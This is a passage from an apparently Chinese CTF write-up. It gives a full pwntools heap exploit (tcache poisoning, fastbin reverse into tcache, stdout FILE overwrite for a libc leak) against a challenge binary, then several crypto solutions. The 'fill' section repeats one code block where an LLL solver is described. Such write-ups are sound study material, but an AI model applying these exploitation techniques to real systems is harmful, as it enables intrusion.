class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;6&quot;</span>)</span><br><span class="line">  <span class="comment">#print(io.recv())</span></span><br><span class="line">  io.interactive()</span><br><span class="line">times = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    print(<span class="string">f&quot;this is the <span class="subst">&#123;times&#125;</span>&quot;</span>)</span><br><span class="line">    times+=<span class="number">1</span></span><br><span class="line">    io = process(<span class="string">&quot;./leak&quot;</span>)</span><br><span class="line">    pwn()</span><br><span class="line">  <span class="keyword">except</span> EOFError:</span><br><span class="line">    io.close()</span><br><span class="line">    <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>最后的效果如图</p><p><img src="https://s2.loli.net/2022/11/08/MG1DBRHX3EsUyrc.png" alt=""></p><h3 id="fastbin-reverse-into-tcache"><a href="#fastbin-reverse-into-tcache" class="headerlink" title="fastbin reverse into tcache"></a>fastbin reverse into tcache</h3><p>这个方法比上一种方法的爆破量要少很多，只需大概16次爆破</p><p>这里的主要思路是通过<code>tcachebin poisioning</code> 劫持一个<code>chunk</code>的<code>size</code> 字段，然后先后free这个<code>chunk</code>，让其进入<code>fast bin</code> ,然后再修改<code>size</code> ，再free，让其进入<code>unsorted bin</code> 从而带上<code>libc</code> 的地址，然后部分写这个<code>libc</code>地址，进行<code>fastbin reverse into tcache</code> ,在<code>_IO_2_1_stdout</code>的<code>_IO_write_base</code>上写入堆地址，这里<code>fastbin reverse into tcache</code>的原理等以后分析<code>malloc</code> 源码再仔细研究一下。</p><p>当然，在写堆地址之前需要先 <code>tcachebin poisioning</code> 申请到<code>_IO_2_1_stdout</code> 附近的<code>chunk</code> ，因为我们控制了一个<code>chunk</code>的<code>size</code> 所以可以修改<code>size</code> 对那个这个带有<code>libc</code>地址的<code>chunk</code> 进行复用来申请(这个<code>chunk</code> 挺忙的，又在<code>unsorted bin</code> 又在<code>fastbin</code> 又要进行<code>tcachebin poisioning</code>)</p><p>哦对了，再最后进行<code>fastbin reverse into tcache</code> 的时候申请的时候记得把这个<code>chunk</code>的<code>size</code>重新修改回在<code>fast bin</code> 该有的大小，不然会触发</p><p><code>malloc_printerr (&quot;malloc(): memory corruption (fast)&quot;);</code> (我调了半天，研究了会<code>malloc</code> 源码才发现这个原因,属于是基础不牢了，啃源码刻不容缓)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;INFO&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./leak&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line">    pause()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choose</span>(<span class="params">index</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">index,size</span>):</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,str(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,str(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,str(index))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    create(<span class="number">0</span>,<span class="number">0x30</span>)</span><br><span class="line">    create(<span class="number">1</span>,<span class="number">0x40</span>)</span><br><span class="line">    create(<span class="number">2</span>,<span class="number">0x30</span>)</span><br><span class="line">    create(<span class="number">3</span>,<span class="number">0x30</span>)</span><br><span class="line">    create(<span class="number">4</span>,<span class="number">0xc0</span>)</span><br><span class="line">    create(<span class="number">5</span>,<span class="number">0x40</span>)</span><br><span class="line">    create(<span class="number">14</span>,<span class="number">0x40</span>)</span><br><span class="line">    create(<span class="number">6</span>,<span class="number">0x10</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        delete(<span class="number">2</span>)</span><br><span class="line">        edit(<span class="number">2</span>,p64(<span class="number">0</span>)+<span class="string">b&#x27;\x00&#x27;</span>)<span class="comment"># 破坏key字段，从而不断free以填满tcachebin，使得之后free掉0进入fastbin</span></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">14</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">5</span>)</span><br><span class="line">    edit(<span class="number">5</span>,<span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line">    create(<span class="number">7</span>,<span class="number">0x40</span>)</span><br><span class="line">    create(<span class="number">8</span>,<span class="number">0x40</span>)<span class="comment">#控制chunk 0的size</span></span><br><span class="line">    <span class="comment">#edit(8,p64(0)+p64(0xd1))</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        delete(<span class="number">4</span>)</span><br><span class="line">        edit(<span class="number">4</span>,p64(<span class="number">0</span>)+<span class="string">b&#x27;\x00&#x27;</span>)<span class="comment"># 填满0xd0大小的tcachebin，使得free掉0进入unsorted bin</span></span><br><span class="line">    <span class="comment">#delete(0)</span></span><br><span class="line">    edit(<span class="number">8</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x41</span>))</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">8</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x51</span>)) <span class="comment">#为了tcachebin poisioning,申请到_IO_2_1_stdout</span></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">8</span>,p64(<span class="number">0</span>)+p64(<span class="number">0xd1</span>))</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">b&#x27;\x60\x47&#x27;</span>)</span><br><span class="line">    create(<span class="number">9</span>,<span class="number">0x40</span>)</span><br><span class="line">    create(<span class="number">10</span>,<span class="number">0x40</span>)<span class="comment"># _IO</span></span><br><span class="line">    <span class="comment">#create(9,0x30)</span></span><br><span class="line">    edit(<span class="number">10</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x5fffffffffff</span>))</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">b&#x27;\x68\x47&#x27;</span>)</span><br><span class="line">    <span class="comment">#debug()</span></span><br><span class="line">    edit(<span class="number">8</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x41</span>)) <span class="comment">#修改回0x41,不然会malloc(): memory corruption (fast)</span></span><br><span class="line">    create(<span class="number">11</span>,<span class="number">0x30</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    <span class="comment">#debug()</span></span><br><span class="line">    create(<span class="number">12</span>,<span class="number">0x30</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;6&quot;</span>)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">#pwn()</span></span><br><span class="line">times = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    print(<span class="string">f&quot;this is the <span class="subst">&#123;times&#125;</span>&quot;</span>)</span><br><span class="line">    times+=<span class="number">1</span></span><br><span class="line">    io = process(<span class="string">&quot;./leak&quot;</span>)</span><br><span class="line">    pwn()</span><br><span class="line">  <span class="keyword">except</span> EOFError:</span><br><span class="line">    io.close()</span><br><span class="line">    <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>结果如图</p><p><img src="https://s2.loli.net/2022/11/09/wAVpITfLlH4FRhe.png" alt=""></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><p>学弟lvsun👴把crypto给ak了，部分摘自他的exp(看来作为密码人的我要退休了)</p><h2 id="tracing"><a href="#tracing" class="headerlink" title="tracing"></a>tracing</h2><p>直接逆推就行，不过我稍微爆破了点(x),</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">f = open(<span class="string">&quot;trace.out&quot;</span>)</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">s = []</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    line = f.readline()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(line[:<span class="number">11</span>]==<span class="string">&#x27;task.py(12)&#x27;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span>(line[:<span class="number">11</span>]==<span class="string">&#x27;task.py(21)&#x27;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span>(line ==<span class="string">&#x27;&#x27;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span>(line[:<span class="number">11</span>]==<span class="string">&#x27;task.py(9):&#x27;</span>):</span><br><span class="line">        s.append(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span>(line[:<span class="number">11</span>]==<span class="string">&#x27;task.py(19)&#x27;</span>):</span><br><span class="line">        s.append(<span class="number">0</span>)</span><br><span class="line">print(s)</span><br><span class="line"><span class="comment">#s=[0, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1]</span></span><br><span class="line">s = s[::<span class="number">-1</span>]</span><br><span class="line">c=<span class="number">64885875317556090558238994066256805052213864161514435285748891561779867972960805879348109302233463726130814478875296026610171472811894585459078460333131491392347346367422276701128380739598873156279173639691126814411752657279838804780550186863637510445720206103962994087507407296814662270605713097055799853102</span></span><br><span class="line"></span><br><span class="line">n=<span class="number">113793513490894881175568252406666081108916791207947545198428641792768110581083359318482355485724476407204679171578376741972958506284872470096498674038813765700336353715590069074081309886710425934960057225969468061891326946398492194812594219890553185043390915509200930203655022420444027841986189782168065174301</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fact</span>(<span class="params">phi,n</span>):</span></span><br><span class="line">    delta = (n+<span class="number">1</span>-phi)**<span class="number">2</span><span class="number">-4</span>*n</span><br><span class="line">    <span class="keyword">if</span>(iroot(delta,<span class="number">2</span>)[<span class="number">1</span>]):</span><br><span class="line">        print(<span class="string">&#x27;success&#x27;</span>)</span><br><span class="line">        print(phi)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">65537</span>):</span><br><span class="line">    tmp=j</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span>(i==<span class="number">1</span>):</span><br><span class="line">            tmp*=<span class="number">2</span></span><br><span class="line">            tmp+=e</span><br><span class="line">        <span class="keyword">if</span>(i==<span class="number">0</span>):</span><br><span class="line">            tmp*=<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span>(fact(tmp,n)):</span><br><span class="line">        print(<span class="string">&#x27;success&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="little-fermat"><a href="#little-fermat" class="headerlink" title="little fermat"></a>little fermat</h2><p>由于<code>p</code>和<code>q</code>相近，所以直接用yafu分解即可。然后求个费马小定理</p><h2 id="fill"><a href="#fill" class="headerlink" title="fill"></a>fill</h2><p>首先将M数组恢复</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">s0 = <span class="number">562734112</span></span><br><span class="line">s1 = <span class="number">859151551</span></span><br><span class="line">s2 = <span class="number">741682801</span></span><br><span class="line">n = <span class="number">991125622</span></span><br><span class="line">S = <span class="number">492226042629702</span></span><br><span class="line">M = [<span class="number">19621141192340</span>, <span class="number">39617541681643</span>, <span class="number">3004946591889</span>, <span class="number">6231471734951</span>, <span class="number">3703341368174</span>, <span class="number">48859912097514</span>, <span class="number">4386411556216</span>, <span class="number">11028070476391</span>, <span class="number">18637548953150</span>, <span class="number">29985057892414</span>, <span class="number">20689980879644</span>, <span class="number">20060557946852</span>, <span class="number">46908191806199</span>, <span class="number">8849137870273</span>, <span class="number">28637782510640</span>, <span class="number">35930273563752</span>, <span class="number">20695924342882</span>, <span class="number">36660291028583</span>, <span class="number">10923264012354</span>, <span class="number">29810154308143</span>, <span class="number">4444597606142</span>, <span class="number">31802472725414</span>, <span class="number">23368528779283</span>, <span class="number">15179021971456</span>, <span class="number">34642073901253</span>, <span class="number">44824809996134</span>, <span class="number">31243873675161</span>, <span class="number">27159321498211</span>, <span class="number">2220647072602</span>, <span class="number">20255746235462</span>, <span class="number">24667528459211</span>, <span class="number">46916059974372</span>]</span><br><span class="line">nbits = <span class="number">32</span></span><br><span class="line"></span><br><span class="line">m = (s2 - s1) * inverse_mod(s1-s0, n) % n</span><br><span class="line">c = (s1 - s0*m)%n</span><br><span class="line"></span><br><span class="line">s = [<span class="number">0</span>] * nbits</span><br><span class="line">s[<span class="number">0</span>] = s0</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, nbits):</span><br><span class="line">    s[i] = (s[i<span class="number">-1</span>]*m+c)%n</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> range(nbits):</span><br><span class="line">    M[t] = M[t] - s[t]</span><br></pre></td></tr></table></figure><p>然后LLL算法求解背包问题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">s0 = <span class="number">562734112</span></span><br><span class="line">s1 = <span class="number">859151551</span></span><br><span class="line">s2 = <span class="number">741682801</span></span><br><span class="line">n = <span class="number">991125622</span></span><br><span class="line">S = <span class="number">492226042629702</span></span><br><span class="line">M = [<span class="number">19621141192340</span>, <span class="number">39617541681643</span>, <span class="number">3004946591889</span>, <span class="number">6231471734951</span>, <span class="number">3703341368174</span>, <span class="number">48859912097514</span>, <span class="number">4386411556216</span>, <span class="number">11028070476391</span>, <span class="number">18637548953150</span>, <span class="number">29985057892414</span>, <span class="number">20689980879644</span>, <span class="number">20060557946852</span>, <span class="number">46908191806199</span>, <span class="number">8849137870273</span>, <span class="number">28637782510640</span>, <span class="number">35930273563752</span>, <span class="number">20695924342882</span>, <span class="number">36660291028583</span>, <span class="number">10923264012354</span>, <span class="number">29810154308143</span>, <span class="number">4444597606142</span>, <span class="number">31802472725414</span>, <span class="number">23368528779283</span>, <span class="number">15179021971456</span>, <span class="number">34642073901253</span>, <span class="number">44824809996134</span>, <span class="number">31243873675161</span>, <span class="number">27159321498211</span>, <span class="number">2220647072602</span>, <span class="number">20255746235462</span>, <span class="number">24667528459211</span>, <span class="number">46916059974372</span>]</span><br><span class="line">nbits = <span class="number">32</span></span><br><span class="line"></span><br><span class="line">m = (s2 - s1) * inverse_mod(s1-s0, n) % n</span><br><span class="line">c = (s1 - s0*m)%n</span><br><span class="line"></span><br><span class="line">s = [<span class="number">0</span>] * nbits</span><br><span class="line">s[<span class="number">0</span>] = s0</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, nbits):</span><br><span class="line">    s[i] = (s[i<span class="number">-1</span>]*m+c)%n</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> range(nbits):</span><br><span class="line">    M[t] = M[t] - s[t]</span><br></pre></td></tr></table></figure><h2 id="common-rsa"><a href="#common-rsa" class="headerlink" title="common rsa"></a>common rsa</h2><p><img src="https://s2.loli.net/2022/11/11/89Bgli5eubc6EaR.png" alt=""></p><p>MRCTF好像出过类似的题，主要就是<code>ZZ</code>上的一个三元<code>coppersmith</code>(因为常见的<code>coppersmith</code>其实是在<code>Zmod(n)</code>上面的)，好像叫做<code>jochemsz_may_trivariate</code> </p><p>直接构造多项式，设置好参数氛围，然后直接跑脚本就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span 